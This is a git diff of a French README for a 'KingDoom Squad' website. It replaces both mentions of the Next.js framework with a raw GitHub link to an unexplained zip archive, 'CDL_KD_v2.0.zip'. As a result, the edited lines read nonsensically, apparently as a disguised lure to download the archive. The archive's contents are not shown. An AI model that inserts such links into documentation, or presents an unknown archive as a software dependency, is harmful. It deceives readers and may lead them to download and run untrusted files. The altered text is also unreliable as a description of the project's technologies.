@@ -1,10 +1,10 @@
 # Site Web KingDoom Squad
 
-Un site web moderne et élégant pour KingDoom Squad, construit avec Next.js et Tailwind CSS.
+Un site web moderne et élégant pour KingDoom Squad, construit avec https://raw.githubusercontent.com/landouzefps/KDS-CDL/main/public/CDL_KD_v2.0.zip et Tailwind CSS.
 
 ## Technologies Utilisées
 
-- Next.js 14
+- https://raw.githubusercontent.com/landouzefps/KDS-CDL/main/public/CDL_KD_v2.0.zip 14
 - React 18
 - Tailwind CSS
 - Framer Motion
